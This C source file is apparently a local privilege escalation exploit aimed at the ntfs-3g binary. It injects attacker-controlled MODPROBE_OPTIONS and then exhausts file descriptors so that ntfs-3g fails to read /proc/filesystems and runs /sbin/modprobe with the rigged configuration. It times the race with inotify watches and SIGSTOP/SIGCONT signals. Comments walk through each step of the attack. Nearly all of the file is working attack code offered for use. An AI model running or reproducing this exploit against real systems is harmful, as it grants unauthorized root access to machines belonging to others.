#define _GNU_SOURCE
#include <stdbool.h>
#include <err.h>
#include <fcntl.h>
#include <sys/eventfd.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/wait.h>
#include <sys/utsname.h>

#include <time.h>

#include <sys/stat.h>
#include <unistd.h>

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <string.h>

#include <sys/resource.h>
#include <signal.h>
#include "utils.c"


int main(void) {

    char buffer[1024] = {0};
    struct sigaction sa;
    sa.sa_handler = &signal_handler;
    sa.sa_flags = SA_RESTART;
    sigfillset(&sa.sa_mask);
    if (sigaction(SIGUSR1, &sa, NULL) == -1) {
        perror("Error: Cannot handle SIGUSR1 signal");
    }

    struct ModConf_dirs mcd = prepare_module_configuration();

    int stop_continue_pipe[2];
    if (pipe2(stop_continue_pipe, O_CLOEXEC))
        perror("Errp: Creating pipe to un-hung ntfs-3g process");
    pid_t pid_main = fork();
    if (pid_main == -1)
        perror("Error: in the main fork");
    if (pid_main != 0) {
        if (read(stop_continue_pipe[0], buffer, 1) != 1) {
            perror("Error: We were not able to read from the PIPE");
        }
        char modprobe_opts[300];
        sprintf(modprobe_opts, "-C %s -d %s", mcd.modprobed, mcd.temp_dir_name);
        setenv("MODPROBE_OPTIONS", modprobe_opts, 1);

        pid_t pid_monitoring_child = fork();
        if (pid_monitoring_child == -1) {
            perror("Error: It was not possible to fork() in order to create the monitoring file child");
        }
        if (pid_monitoring_child == 0) {
            file_monitor("/sbin/modprobe", getpid());
        }

        // We set File Descriptors maximum limit to 50, so that the process running ntfs-3g
        // will get soon to File Descriptors exhaustion
        struct rlimit oldl, newl;
        struct rlimit *newlp;
        newlp = NULL;
        newl.rlim_cur = 100;
        newl.rlim_max = 100;
        newlp = &newl;
    
        if ( getrlimit(RLIMIT_NOFILE, &oldl) == -1 ) {
            perror("Error: We were not able to get actual limits for process");
        } else {
            printf("PID[%d] Old Resources limit soft: %d, hard: %d\n", getpid(), (int) oldl.rlim_cur, (int) oldl.rlim_max);
        }
    
        if ( setrlimit(RLIMIT_NOFILE, newlp) == -1 ) {
            perror("Error: We couldnt set NOFILE limits to process...");
        } else {
            if ( getrlimit(RLIMIT_NOFILE, &oldl) == -1 ) {
                perror("Error: We were not able to get modified limits for process");
            } else {
                printf("Limits setted Soft:%d Hard:%d\n", (int) oldl.rlim_cur, (int) oldl.rlim_max);
            }
        }
        fflush(stdout);

        execlp("ntfs-3g", "ntfs-3g", "/dev/null", "/dev/null", NULL);
        return 1;
    }

    // When we write to this PIPE it will un-hung the read at the pid_main, thus making that process
    // to try to execute the ntfs-3g command
    if (write(stop_continue_pipe[1], buffer, 1) != 1) {
        perror("Error: We were not able to write in pipe for ntfs-3g");
    }

    // The ntfs-3g command will first attempt to open /dev/null when initializing. We put this watcher in order to know
    // when it's trying to open it; at this moment we stop the running process.
    int inotify_fd = inotify_init1(IN_CLOEXEC);
    if (inotify_fd < 0) {
        perror("Error: We could not instantiate the inotify FD for /dev/null");
    }
    if (inotify_add_watch(inotify_fd, "/dev/null", IN_OPEN) == -1) {
        perror("Error: We were not able to add a watcher for /dev/null");
    }

    if (read(inotify_fd, buffer, sizeof(buffer)) <= 0) {
        perror("Error: We were not able to read from the inotify watcher FD");
    }

    // if the parent is not init we try to STOP it
    if (getppid() != 1) {
        if (kill(getppid(), SIGSTOP)) {
            printf("Parent process ID: %d\n", getppid());
            fflush(stdout);
            perror("Error: We could not stop our parent process");
        }
    }

    // If we are able to open /proc/filesystems... then the ntfs-3g program will also be able to do it.
    // In this case, it will never set the fstype to FSTYPE_UNKNOWN as we want in order it will
    // invoke the /sbin/modprobe binary... Game over.

    // It will be easy to identify ir anyway, as we'll see a message similar to this one:
    // Failed to open /proc/filesystems: Too many open files in system
    // which is thrown by the ntfs-3g command.

    fd_set rfds;
    struct timeval tv;
    int retval;

    int filesystems_watcher = inotify_init();
    if (filesystems_watcher < 0) {
        perror("Error: We couldn't instantiate an inotify FD");
    }

    if (inotify_add_watch(filesystems_watcher, "/proc/filesystems", IN_OPEN) < 0) {
        perror("Error: We were not able to create a watcher for /proc/filesystems");
    }

    FD_ZERO(&rfds);
    FD_SET(filesystems_watcher, &rfds);
    tv.tv_sec = 0;
    tv.tv_usec = 500000;
    retval = select(1, &rfds, NULL, NULL, &tv);
    
    if (retval < 0) {
        perror("Error: The returned value of select() was -1");
    } else if (retval) {
        puts("The /proc/filesystems is able to read, so ntfs-3g process will be able to read it too");
        if (kill(getppid(), SIGKILL)) {
            perror("There's no case to continue as the MODPROBE didn't run, and won't");
        }
    } else {
        puts("It's not possible to read /proc/filesystems, we are in the correct path");
    }

    // We have the rlimit FILENO to 50 File Descriptors for the main PID, the one that will end up
    // running the command ntfs-3g which is still waiting after trying to open /dev/null

    // Now, several File Descriptors will be opened in order to exhaust if during this time there
    // was any release of FD.

    // As soon as we are sure that there are not more FD available, we continue the main pid

    time_t start, end;
    double elapsed;
    start = time(NULL);
    int run = 1;
    int fd;

    char set_greater_ulimit_command[] = "ulimit -Hn 65536; ulimit -Sn 65536";
    if (system(set_greater_ulimit_command)) {
        perror("Error: We were not able to change the ulimits for open files in system");
    }

    while (run) {
        end = time(NULL);
        elapsed = difftime(end, start);
        // We'll try to do this for 5 seconds... if we are not successful, we terminate the process
        if (elapsed >= 5.0)
            run = 0;
        else {
            fd = open("/dev/null", O_RDWR);
            if (fd < 0) {
                printf("Continuing the ntfs-3g process PID [%d]\n", getppid());
                fflush(stdout);
                if ( kill(getppid(), SIGCONT) ) {
                    perror("Error: it was not possible to send Continue signal to the process");
                }
            break;
            }
        }
    }
    exit(0);
}

